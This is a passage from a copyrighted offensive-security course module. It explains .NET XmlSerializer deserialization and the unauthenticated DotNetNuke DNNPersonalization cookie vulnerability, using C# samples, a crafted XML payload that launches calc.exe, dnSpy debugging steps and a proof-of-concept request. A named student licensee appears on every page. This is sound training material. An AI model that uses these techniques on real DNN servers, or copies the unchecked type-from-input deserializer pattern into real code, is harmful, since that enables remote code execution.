Revert the DNN virtual machine from your student control panel. You will find the credentials to 
the DotNetNuke server and application accounts in the Wiki. 
The concept of serialization (and deserialization) has existed in computer science for a number of 
years. Its purpose is to convert a data structure into a format that can be stored or transmitted 
over a network link for future consumption. 
While a deeper discussion of the typical use of serialization (along with its many intricacies) is 
beyond the scope of this module, it is worth mentioning that serialization on a very high level 
involves a “producer” and a “consumer” of the serialized object. In other words, an application can 
define and instantiate an arbitrary object and modify its state in some way. It can then store the 
state of that object in the appropriate format (for example a binary file) using serialization. As 
long as the format of the saved file is understood by the “consumer” application, the object can be 
recreated in the process space of the consumer and further processed as desired. 
Due to its extremely useful nature, serialization is supported in many modern programming 
languages. As it so happens, many useful programming constructs can also be used for more 
nefarious reasons if they are implemented in an unsafe manner. For example, the topic of 
deserialization dangers in Java has been discussed exhaustively in the public domain for many 
years. Similarly, over the course of our penetration testing engagements, we have discovered and 
exploited numerous deserialization vulnerabilities in applications written in languages such as 
PHP and Python. 
Nevertheless, deserialization as an attack vector in .NET applications has arguably been less 
discussed than in other languages. It is important to note however that this idea is not new. 
James Forshaw has expertly discussed this attack vector in his Black Hat 2012 presentation.70 
More recently, researchers Alvaro Muñoz and Oleksandr Mirosh have expanded upon this earlier 
research and reported exploitable deserialization vulnerabilities in popular applications as a result 
of their work.71 
One of these vulnerabilities, namely the DotNetNuke cookie deserialization, is the basis for this 
module. 
7.1 Serialization Basics 
Before we get into the thorough analysis of the vulnerability, we first need to cover some basic 
concepts in practice. This will help us understand the more complex scenarios later on. There are 
various formats in which the serialized objects can be stored–we have already suggested a 
 
70 (James Forshaw, 2012), https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf 
71 (Alvaro Muñoz, Oleksandr Mirosh, 2017), https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-
Attacks.pdf 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
189 
binary format as an option, which in the case of .NET, would likely be handled by the 
BinaryFormatter class.72 
Nevertheless, for the purposes of this module, we will focus on the XMLSerializer class73 as it 
directly relates to the vulnerability we will discuss. 
7.1.1 XmlSerializer Limitations 
Before we continue our analysis, we need to highlight some characteristics of the XmlSerializer 
class. As stated in the official Microsoft documentation,74 XmlSerializer is only able to serialize 
public properties and fields of an object. 
Furthermore, the XmlSerializer class supports a narrow set of objects primarily due to the fact 
that it cannot serialize abstract classes. Finally, the type of the object being serialized always has 
to be known to the XmlSerializer instance at runtime. Attempting to deserialize object types 
unknown to the XmlSerializer instance will result in a runtime exception. 
We encourage you to read more about the specific capabilities and limitations of XmlSerializer. 
For now however, we just need to keep these limitations in mind as they will play a role later on in 
our analysis. 
7.1.2 Basic XmlSerializer Example 
In our first basic example, we will create two very simple applications. One will create an instance 
of an object, set one of its properties, and finally serialize it to an XML file through the help of the 
XmlSerializer class. The other application will read the file in which the serialized object has been 
stored and deserialize it. 
The following listing shows the code for the serializer application. 
01: using System; 
02: using System.IO; 
03: using System.Xml.Serialization; 
04:  
05: namespace BasicXMLSerializer 
06: { 
07:     class Program 
08:     { 
09:         static void Main(string[] args) 
10:         { 
11:             MyConsoleText myText = new MyConsoleText(); 
12:             myText.text = args[0]; 
13:             MySerializer(myText); 
14:         } 
15:  
16:         static void MySerializer(MyConsoleText txt) 
17:         { 
 
72 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netframework-4.7.2 
73 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=netframework-4.7.2 
74 (Microsoft, 2017), https://docs.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
190 
18:             var ser = new XmlSerializer(typeof(MyConsoleText)); 
19:             TextWriter writer = new 
StreamWriter("C:\\Users\\Public\\basicXML.txt"); 
20:             ser.Serialize(writer, txt); 
21:             writer.Close(); 
22:         } 
23:     } 
24:  
25:     public class MyConsoleText 
26:     { 
27:         private String _text; 
28:  
29:         public String text 
30:         { 
31:             get { return _text; } 
32:             set { _text = value; Console.WriteLine("My first console text class 
says: " + _text); } 
33:         } 
34:     } 
35: } 
Listing 204 - A very basic XmlSerializer application. 
There are a couple of points that need to be highlighted in the code from Listing 204. Our 
namespace contains the implementation of the MyConsoleText class starting on line 25. This 
class prints out a sentence to the console containing the string that is stored in its private "_text" 
property when its public counterpart is set.  
On lines 11-12, we create an instance of the MyConsoleText class and set its “text” property to the 
string that will be passed on the command line. Finally, on line 18 we create an instance of the 
XmlSerializer class and on line 20, we serialize our myText object and save it in the 
C:\Users\Public\basicXML.txt file. 
Let’s now take a quick look at the deserializer application. 
01: using System.IO; 
02: using System.Xml.Serialization; 
03: using BasicXMLSerializer; 
04:  
05: namespace BasicXMLDeserializer 
06: { 
07:     class Program 
08:     { 
09:         static void Main(string[] args) 
10:         { 
11:             var fileStream = new FileStream(args[0], FileMode.Open, 
FileAccess.Read); 
12:             var streamReader = new StreamReader(fileStream); 
13:             XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText)); 
14:             serializer.Deserialize(streamReader); 
15:         } 
16:     } 
17: } 
Listing 205 - A very basic deserializing application 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
191 
Our deserializer application simply creates an instance of the XmlSerializer class using the 
MyConsoleText object type and then deserializes the contents of our input file into an instance of 
the original object. It is important to remember that the XmlSerializer has to know the type of the 
object it will deserialize. Considering that this application does not have the MyConsoleText class 
defined in its own namespace, we need to reference the BasicXMLSerializer assembly in our 
Visual Studio project (Figure 129). 
 
Figure 129: A reference to the BasicXMLSerializer executable has to be present in our deserializer project 
To add a reference to the desired executable file, we can use the Project menu in Visual Studio 
and use the Add Reference option. This will bring up a dialog box, which we can use to browse to 
our target executable file and add it to our project as a reference. The BasicXMLSerializer 
namespace can then be “used” in our example code as shown on line 3 of Listing 205. 
Before testing our applications we need to compile them. To do so we can use the Build > Build 
Solution menu option in Visual Studio. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
192 
 
Figure 130: Compiling the application source code 
Once the compilation process is completed, we’ll first run our serializer application, passing a 
string to it at the command line. 
C:\Users\Administrator\source\repos\BasicXMLSerializer\BasicXMLSerializer\bin\x64\Debu
g>BasicXMLSerializer.exe "Hello AWAE" 
My first console text class says: Hello AWAE 
Listing 206 - Basic serialization of user-defined text 
After running the application, our serialized object looks like the following: 
<?xml version="1.0" encoding="utf-8"?> 
<MyConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema"> 
  <text>Hello AWAE</text> 
</MyConsoleText> 
Listing 207 - Our serialized object as stored in basicXML.txt 
Finally, we deserialize our object by running BasicXMLDeserializer.exe while passing the filename 
generated by BasicXMLSerializer.exe. 
C:\Users\Administrator\source\repos\BasicXMLDeserializer\BasicXMLDeserializer\bin\x64\
Debug>BasicXMLDeserializer.exe "C:\Users\Public\basicXML.txt" 
My first console text class says: Hello AWAE 
Listing 208 - Basic deserialization of an object containing user-defined text 
The “Hello AWAE” output in Listing 208 is the result of the execution of the code present in the 
MyConsoleText setter method. Notice how the setter of our property was automatically executed 
during the deserialization of the target object. This is an important concept for an attacker. In 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
193 
some cases, by using object properties the setters can trigger the execution of additional code 
during deserialization. 
In this case, another interesting aspect is that we would be able to manually change the contents 
of basicXML.txt in a trivial way, since the serialized object is written in XML format. We could for 
example change the content of the “text” tag (Listing 207) and have a string of our choice 
displayed in the console once the object is deserialized. 
This previous example is very basic in nature, but it demonstrates exactly how XML serialization 
works in .NET. Now let’s expand upon our example scenario. 
7.1.2.1 Exercise 
Repeat the steps outlined in the previous section and make sure that you can compile and 
execute the Visual Studio solutions. 
7.1.3 Expanded XmlSerializer Example 
Our previous example was rather rigid in that it could only deserialize an object of the type 
MyConsoleText, because that was hardcoded in the XmlSerializer constructor call. 
XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText)); 
Listing 209 - Our XmlSerializer example could only handle a single type 
As that seems rather limiting, a developer could decide to make the custom deserializing wrapper 
a bit more flexible. This would provide the application with the ability to deserialize multiple types 
of objects. Let’s examine one possible way of how this would look in practice. Note that the 
following examples borrow heavily from the DNN code base in order to streamline our analysis. 
Our new serializing application now looks like this: 
01: using System; 
02: using System.IO; 
03: using System.Xml; 
04: using System.Xml.Serialization; 
05:  
06: namespace MultiXMLSerializer 
07: { 
08:     class Program 
09:     { 
10:         static void Main(string[] args) 
11:         { 
12:             String txt = args[0]; 
13:             int myClass = Int32.Parse(args[1]); 
14:  
15:             if (myClass == 1) 
16:             { 
17:                 MyFirstConsoleText myText = new MyFirstConsoleText(); 
18:                 myText.text = txt; 
19:                 CustomSerializer(myText); 
20:             } 
21:             else 
22:             { 
23:                 MySecondConsoleText myText = new MySecondConsoleText(); 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
194 
24:                 myText.text = txt; 
25:                 CustomSerializer(myText); 
26:             } 
27:         } 
28:  
29:         static void CustomSerializer(Object myObj) 
30:         { 
31:             XmlDocument xmlDocument = new XmlDocument(); 
32:             XmlElement xmlElement = xmlDocument.CreateElement("customRootNode"); 
33:             xmlDocument.AppendChild(xmlElement); 
34:             XmlElement xmlElement2 = xmlDocument.CreateElement("item"); 
35:             xmlElement2.SetAttribute("objectType", 
myObj.GetType().AssemblyQualifiedName); 
36:             XmlDocument xmlDocument2 = new XmlDocument(); 
37:             XmlSerializer xmlSerializer = new XmlSerializer(myObj.GetType()); 
38:             StringWriter writer = new StringWriter(); 
39:             xmlSerializer.Serialize(writer, myObj); 
40:             xmlDocument2.LoadXml(writer.ToString()); 
41:             
xmlElement2.AppendChild(xmlDocument.ImportNode(xmlDocument2.DocumentElement, true)); 
42:             xmlElement.AppendChild(xmlElement2); 
43:  
44:             File.WriteAllText("C:\\Users\\Public\\multiXML.txt", 
xmlDocument.OuterXml); 
45:         } 
46:     } 
47:  
48:     public class MyFirstConsoleText 
49:     { 
50:         private String _text; 
51:  
52:         public String text 
53:         { 
54:             get { return _text; } 
55:             set { _text = value; Console.WriteLine("My first console text class 
says: " + _text); } 
56:         } 
57:     } 
58:  
59:     public class MySecondConsoleText 
60:     { 
61:         private String _text; 
62:  
63:         public String text 
64:         { 
65:             get { return _text; } 
66:             set { _text = value; Console.WriteLine("My second console text class 
says: " + _text); } 
67:         } 
68:     } 
69: } 
Listing 210 - A more versatile XmlSerializer use-case. 
The idea here is very similar to our basic example. Rather than serializing a single type of an 
object, we have given our application the ability to serialize an additional class, namely 
MySecondConsoleText, which we have defined starting on line 59. We can see the instantiation of 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
195 
our two classes on lines 17 and 23 respectively, which is based on the user-controlled argument 
passed on the command line. 
The most interesting parts of this application are found in the CustomSerializer function starting 
on line 29. Specifically, we have decided to pass the information about the type of the object 
being serialized in a custom XML tag called “item”. This can be seen on line 35. Furthermore, 
notice that on line 37, we are not hardcoding the type of the object we are serializing during the 
instantiation of the XmlSerializer class. Instead, we are using the GetType function on the object in 
order to dynamically retrieve that information. 
The serialized object is then wrapped inside a custom-created XML document and written to disk. 
Let’s now look at how the deserializer application will handle these objects. 
01: using System; 
02: using System.Diagnostics; 
03: using System.IO; 
04: using System.Xml; 
05: using System.Xml.Serialization; 
06:  
07: namespace MultiXMLDeserializer 
08: { 
09:     class Program 
10:     { 
11:         static void Main(string[] args) 
12:         { 
13:             String xml = File.ReadAllText(args[0]); 
14:             CustomDeserializer(xml);             
15:         } 
16:  
17:         static void CustomDeserializer(String myXMLString) 
18:         { 
19:             XmlDocument xmlDocument = new XmlDocument(); 
20:             xmlDocument.LoadXml(myXMLString); 
21:             foreach (XmlElement xmlItem in 
xmlDocument.SelectNodes("customRootNode/item")) 
22:             { 
23:                 string typeName = xmlItem.GetAttribute("objectType"); 
24:                 var xser = new XmlSerializer(Type.GetType(typeName)); 
25:                 var reader = new XmlTextReader(new 
StringReader(xmlItem.InnerXml)); 
26:                 xser.Deserialize(reader); 
27:             } 
28:         } 
29:     } 
30: } 
Listing 211 - A more versatile deserializer use-case 
Our new serializer example now has two different serializable classes so our new deserializer 
application has to be aware of those classes in order to properly process the serialized objects. 
Since we are not directly instantiating instances of those classes, there is no need to include the 
using MultiXMLSerializer; directive. Nevertheless, we still need to have a reference to this 
executable in our Visual Studio project. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
196 
 
Figure 131: A reference to an executuable with the target class definitions is required 
However, the most interesting part in our new application can be seen on lines 23-24 (Listing 
211). Specifically, our application now dynamically gathers the information about the type of the 
serialized object from the XML file and uses that to properly construct the appropriate 
XmlSerializer instance. 
Let’s see that in practice. 
C:\Users\Administrator\source\repos\MultiXMLSerializer\MultiXMLSerializer\bin\x64\Debu
g>MultiXMLSerializer.exe "Serializing first class..." 1 
My first console text class says: Serializing first class... 
Listing 212 - Serialization of the first example class 
This is what our resulting XML file looks like (pay attention to the “item” node): 
<customRootNode> 
<item objectType="MultiXMLSerializer.MyFirstConsoleText, MultiXMLSerializer, 
Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"> 
<MyFirstConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema"> 
<text>Serializing first class...</text> 
</MyFirstConsoleText> 
</item> 
</customRootNode> 
Listing 213 - The resulting XML file contents 
And finally, let’s see what happens when we deserialize this object. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
197 
C:\Users\Administrator\source\repos\MultiXMLDeserializer\MultiXMLDeserializer\bin\x64\
Debug>MultiXMLDeserializer.exe ""C:\Users\Public\multiXML.txt" 
My first console text class says: Serializing first class... 
Listing 214 - Deserialization of the first example class 
At this point, it is critical to understand the following: it is possible to change the contents of the 
serialized object file, so that rather than deserializing the MyFirstConsoleClass instance, we can 
deserialize an instance of MySecondConsoleClass. In order to accomplish that, our XML file 
contents should look like this: 
<customRootNode> 
<item objectType="MultiXMLSerializer.MySecondConsoleText, MultiXMLSerializer, 
Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"> 
<MySecondConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema"> 
<text>Serializing first class...</text> 
</MySecondConsoleText> 
</item> 
</customRootNode> 
Listing 215 - Manually modified XML file contents 
If we deserialize this object, we get the following result: 
C:\Users\Administrator\source\repos\MultiXMLDeserializer\MultiXMLDeserializer\bin\x64\
Debug>MultiXMLDeserializer.exe ""C:\Users\Public\multiXML.txt" 
My second console text class says: Serializing first class... 
Listing 216 - Deserialization of the second example class 
It is important to state that this manipulation is possible because we can easily determine the 
object information we need from the source code in order to successfully control the 
deserialization process. However, in cases where we only have access to compiled .NET 
modules, decompilation can be achieved through publicly available tools as we have already seen 
at the beginning of this course. 
7.1.3.1 Exercise 
Repeat the steps outlined in the previous section. Make sure you fully understand how we are 
able to induce the deserialization of a different object type. 
7.1.4 Watch your Type, Dude 
Finally, let’s complete our example by demonstrating how a deserialization implementation such 
as the previous one can be misused. Consider the following change to our MultiXMLDeserializer 
application: 
01: using System; 
02: using System.Diagnostics; 
03: using System.IO; 
04: using System.Xml; 
05: using System.Xml.Serialization; 
06:  
07: namespace MultiXMLDeserializer 
08: { 
09:     class Program 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
198 
10:     { 
11:         static void Main(string[] args) 
12:         { 
13:             String xml = File.ReadAllText(args[0]); 
14:             CustomDeserializer(xml);             
15:         } 
16:  
17:         static void CustomDeserializer(String myXMLString) 
18:         { 
19:             XmlDocument xmlDocument = new XmlDocument(); 
20:             xmlDocument.LoadXml(myXMLString); 
21:             foreach (XmlElement xmlItem in 
xmlDocument.SelectNodes("customRootNode/item")) 
22:             { 
23:                 string typeName = xmlItem.GetAttribute("objectType"); 
24:                 var xser = new XmlSerializer(Type.GetType(typeName)); 
25:                 var reader = new XmlTextReader(new 
StringReader(xmlItem.InnerXml)); 
26:                 xser.Deserialize(reader); 
27:             } 
28:         } 
29:     } 
30:  
31:     public class ExecCMD 
32:     { 
33:         private String _cmd; 
34:         public String cmd 
35:         { 
36:             get { return _cmd; } 
37:             set 
38:             { 
39:                 _cmd = value; 
40:                 ExecCommand(); 
41:             } 
42:         } 
43:  
44:         private void ExecCommand() 
45:         { 
46:             Process myProcess = new Process(); 
47:             myProcess.StartInfo.FileName = _cmd; 
48:             myProcess.Start(); 
49:             myProcess.Dispose(); 
50:         } 
51:     } 
52: } 
Listing 217 - Deserialization application implements an additional class 
Our new version of the deserializer application also implements the ExecCMD class. As the name 
suggests, this class will simply create a new process based on its “cmd” property. We can see 
how this is accomplished starting on line 37. Specifically, the cmd property setter sets the private 
property _cmd based on the value that has been passed and immediately makes a call to the 
ExecCommand function. The implementation of this function can be seen starting on line 44. 
Based on everything we discussed up to this point, it should be clear what our next step would be 
as an attacker. We already know that we can manually manipulate the content of a properly 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
199 
serialized object file in order to trigger the deserialization of an object type that falls within the 
parameters of the XmlSerializer limitations. In our trivial example, the ExecCMD class does not 
violate any of those constraints. Therefore we can change the XML file to look like this: 
<customRootNode> 
<item objectType="MultiXMLDeserializer.ExecCMD, MultiXMLDeserializer, Version=1.0.0.0, 
Culture=neutral, PublicKeyToken=null"> 
<ExecCMD xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema"> 
<cmd>calc.exe</cmd> 
</ExecCMD> 
</item> 
</customRootNode> 
Listing 218 - Manipulation of the XML file to target an unintended object type 
Please notice that we have changed the object type to ExecCMD and that we have also renamed 
the text tag to cmd. This corresponds to the public property name we previously saw in the 
ExecCMD class. Finally, we set that tag value to the process name we would like to initiate, in this 
case calc.exe. If we execute our deserializer application again, we should see the following result: 
 
Figure 132: Deserialization of the ExecCMD object 
As we can see once again in our rather trivial example, as long as we are able to retrieve the class 
information we need and the target class can be deserialized by the XmlSerializer, we can 
instantiate objects that the original developers likely never intended to be deserialized. This is 
possible because in the code we have examined so far, there is no object type verification 
implemented before a user-supplied input is processed by XmlSerializer. 
In some real-world cases, this type of vulnerability can have critical consequences. We will now 
look in detail at such a case involving the DotNetNuke platform. 
7.1.4.1 Exercise 
Repeat the steps outlined in the previous section. Deserialize an object that will spawn a 
Notepad.exe instance. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
200 
7.2 DotNetNuke Vulnerability Analysis 
Now that we have some basic knowledge of XmlSerializer, we can start analyzing the actual 
DotNetNuke vulnerability that was discovered by Muñoz and Mirosh. 
As reported, the vulnerability was found in the processing of the DNNPersonalization cookie, 
which as the name implies, is directly related to a user profile. Interestingly, this vulnerability can 
be triggered without any authentication. 
7.2.1 Vulnerability Overview 
The entry point for this vulnerability is found in the function called LoadProfile, which is 
implemented in the DotNetNuke.dll module. Although the source code for DNN is publicly 
available, for our analysis we will use the dnSpy debugger, as we will need it later on in order to 
trace the execution of our target program. 
Again, in this case we would be able to use the official source code for the DNN platform as it is 
publicly available, but in most real-life scenarios that is not the case. Therefore, using dnSpy for 
decompilation as well as debugging purposes will help us get more familiar with the typical 
workflow in these situations. 
To get started, we will need to use the x64 version of dnSpy since the w3wp.exe process that we 
will be debugging later on is a 64-bit process. In order to decompile our DotNetNuke.dll file, we 
can simply browse to it using the dnSpy File > Open menu or by dragging it from the File Explorer 
onto the dnSpy window. 
 
Figure 133: Decompilation of DotNetNuke.dll 
We 
can 
now 
navigate 
to 
our 
target 
LoadProfile 
function 
located 
in 
the 
DotNetNuke.Services.Personalization.PersonalizationController namespace. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
201 
 
Figure 134: Navigating to the LoadProfile function 
 
Figure 135: The entry point for our DNN vulnerability 
In Figure 135 we can see the implementation of the LoadProfile function shown in dnSpy. It is 
important to note that, as indicated in Muñoz and Mirosh presentation,75 this function can be 
 
75 (Alvaro Muñoz, Oleksandr Mirosh, 2017), https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-
Attacks.pdf 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
202 
triggered any time we visit a nonexistent page within the DNN web application. We will be able to 
confirm this later on. 
At line 24, the function checks for the presence of the “DNNPersonalization” cookie in the 
incoming HTTP request. If the cookie is present, its value is assigned to the local text string 
variable on line 26. Then, on line 29, this variable is passed as the argument to the 
DeserializeHashTableXml function. 
If we follow this execution path, we will see the following implementation of the 
DeserializeHashTableXml function: 
 
Figure 136: DeserializeHashTableXml function implementation 
Figure 136 shows that DeserializeHashTableXml acts as a wrapper for the DeSerializeHashtable 
function. Take note that the second argument passed in this function call on line 2461 is the 
hardcoded string “profile”. This will be important later on in our exploit development. 
Continuing to follow the execution path, we arrive at the implementation of the 
DeSerializeHashtable function. 
 
Figure 137: Implementation of the DeSerializeHashtable function 
As we mentioned in our basic XmlSerializer examples, we had borrowed heavily from the DNN 
code base to demonstrate some of the pitfalls of deserialization. Therefore, the structure of the 
DeSerializeHashtable function shown in Figure 137 should look very familiar. Essentially, this 
function is responsible for the processing of the DNNPersonalization XML cookie using the 
following steps: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
203 
• 
look for every item node under the profile root XML tag (line 156) 
• 
extract the serialized object type information from the item node “type” attribute (line 160) 
• 
create a XmlSerializer instance based on the extracted object type information (line 161) 
• 
deserialize the user-controlled serialized object (line 163) 
Since it appears that no type checking is performed on the input object during deserialization, this 
certainly seems very exciting from the attacker perspective. However, to continue our analysis, we 
need to take a quick break and set up our debugging environment so that we can properly follow 
the execution flow of the target application while processing our malicious cookie values. 
7.2.2 Manipulation of Assembly Attributes for Debugging 
Debugging .NET web applications can sometimes be a bit tricky due to the optimizations that are 
applied to the executables at runtime. One of the ways these optimizations manifest themselves 
in a debugging session is by preventing us from setting breakpoints at arbitrary code lines. In 
other words, the debugger is unable to bind the breakpoints to the exact lines of code we would 
like to break at. As a consequence of this, in addition to not being able to break where we want, at 
times we are also not able to view the values of local variables that exist at that point. This can 
make debugging .NET applications harder than we would like. 
Fortunately, there is a way to modify how a target executable is optimized at runtime.76 More 
specifically, most software will be compiled and released in the Release version, rather than 
Debug. As a consequence, one of the assembly attributes would look like this: 
[assembly: 
Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)] 
Listing 219 - Release versions of .NET assemblies are optimized at runtime 
In order to enable a better debugging experience, i.e. to reduce the amount of optimization 
performed at runtime, we can change that attribute,77,78 to resemble the following: 
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | 
DebuggableAttribute.DebuggingModes.DisableOptimizations | 
DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | 
DebuggableAttribute.DebuggingModes.EnableEditAndContinue)] 
Listing 220 - Specific assembly attributes can control the amount of optimization applied at runtime 
As it so happens, this can be accomplished trivially using dnSpy. However, we need to make sure 
that we modify the correct assembly before we start debugging. In this instance, our target is the 
C:\inetpub\wwwroot\dotnetnuke\bin\DotNetNuke.dll file. It is important to note that once the IIS 
worker process starts, it will NOT load the assemblies from this directory. Rather it will make 
copies of all the required files for DNN to function and will load them from the following directory: 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\dotnetnuke\. 
 
76 (dnSpy, 2019), https://github.com/0xd4d/dnSpy/wiki/Making-an-Image-Easier-to-Debug 
77 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.diagnostics.debuggableattribute.debuggingmodes?redirectedfrom=MSDN&view=netframework-4.7.2 
78 (Rick Byers, 2005), https://blogs.msdn.microsoft.com/rmbyers/2005/09/08/debuggingmodes-ignoresymbolstoresequencepoints/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
204 
As always, before we do anything we should make a backup of the file(s) we intend to 
manipulate. We can then open the target assembly in dnSpy, right-click on its name in the 
Assembly Explorer and select the Edit Assembly Attributes (C#) option from the context menu 
(Figure 138). The same option can also be accessed through the Edit menu. 
 
Figure 138: Accessing the Edit Assembly Attributes menu 
Clicking on that option opens an editor for the assembly attributes. 
 
Figure 139: Assembly attributes 
Here we need to replace the attribute we mentioned in Listing 219 (line 11) to the contents found 
in Listing 220. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
205 
 
Figure 140: Editing the assembly attributes 
Once we replace the relevant assembly attribute, we can just click on the Compile button, which 
will close the edit window. Finally, we’ll save our edited assembly by clicking on the File > Save 
Module menu option, which presents us with the following dialog box: 
 
Figure 141: Saving the edited assembly 
We can accept the defaults and have the edited assembly overwrite the original. At this point we 
are ready to start using our dnSpy debugger. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
206 
7.2.2.1 Exercise 
Change the attributes of DotNetNuke.dll and make sure you can properly recompile and save the 
assembly. 
7.2.3 Debugging DotNetNuke Using dnSpy 
As we did in earlier modules, we will once again rely on our Burp proxy to precisely control our 
payloads. Please note that the web browser proxy settings on your lab VM have already been set. 
Therefore, make sure that BurpSuite is already running before you browse to the DNN webpage. 
Furthermore, we will also use the dnSpy debugger to see exactly how our payloads are being 
processed. While we are already familiar with Burp and its setup, we need to spend a bit of time 
on the dnSpy mechanics. Please refer to the videos in order to see the following process in detail. 
In order to properly debug DNN, we will need to attach our debugger (Debug > Attach menu entry) 
to the w3wp.exe process. This is the IIS worker process under which our instance of DNN is 
running. Please note that if you are unable to see the w3wp.exe process in the Attach to Process 
dialog box (Figure 142) in dnSpy, you simply need to browse to the DNN instance using a web 
browser. This will trigger IIS to start the appropriate worker process. You will then be able to see 
the w3wp.exe instance in the dialog box after clicking on the Refresh button. 
 
Figure 142: Debugging the w3wp.exe process 
Once we attach to our process, the first thing we need to do is pause its execution using the 
appropriate Debug menu option or the shortcut menu button. We then need to access Debug > 
Windows > Modules to list all the modules loaded by our w3wp.exe process. 
 
Figure 143: Listing of loaded modules 
By right-clicking on any of the listed modules, we can access the Open All Modules context menu. 
This will then load all available modules in the Assembly Explorer pane, which will allow us to 
easily access and decompile any DNN class we would like to investigate. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
207 
 
Figure 144: Loading all relevant DNN modules into dnSpy 
Once the modules are loaded, we can navigate to the LoadProfile(int,int) function implementation 
located in the DotNetNuke.Services.Personalization.PersonalizationController namespace in the 
DotNetNuke.dll assembly. We can then set a breakpoint on line 24, where our initial analysis 
started. 
 
Figure 145: Setting the inital breakpoint 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
208 
7.2.3.1.1 
 
We are finally ready to send our first proof-of-concept HTTP request. We can do that by selecting 
a captured unauthenticated request from our Burp history and sending it to the Repeater tab, 
where we will add the DNNPersonalization cookie. We also need to remember to change the URL 
path in our request to a nonexistent page. Our PoC request should look similar to the one below. 
 
Figure 146: Our first proof-of-concept request 
If everything has gone as planned, we should hit our breakpoint in dnSpy after we send our 
request as shown below. 
 
Figure 147: Our first breakpoint is triggered 
7.2.3.2 Exercise 
After setting a breakpoint on the vulnerable LoadProfile function, send a proof-of-concept request 
as described in the previous section and make sure you can reach it. 
7.2.4 How Did We Get Here? 
Although we have trusted the original advisory blindly and were able to validate that we can 
indeed trigger the LoadProfile function, as researchers we were still missing something. 
Specifically, it is unusual to see any sort of personalization data being processed when it is 
originating from an unauthenticated perspective. Furthermore, we wanted to have an idea of what 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
209 
sort of functions were involved during the processing of the HTTP request that triggers the 
vulnerability. So we dug a little deeper. 
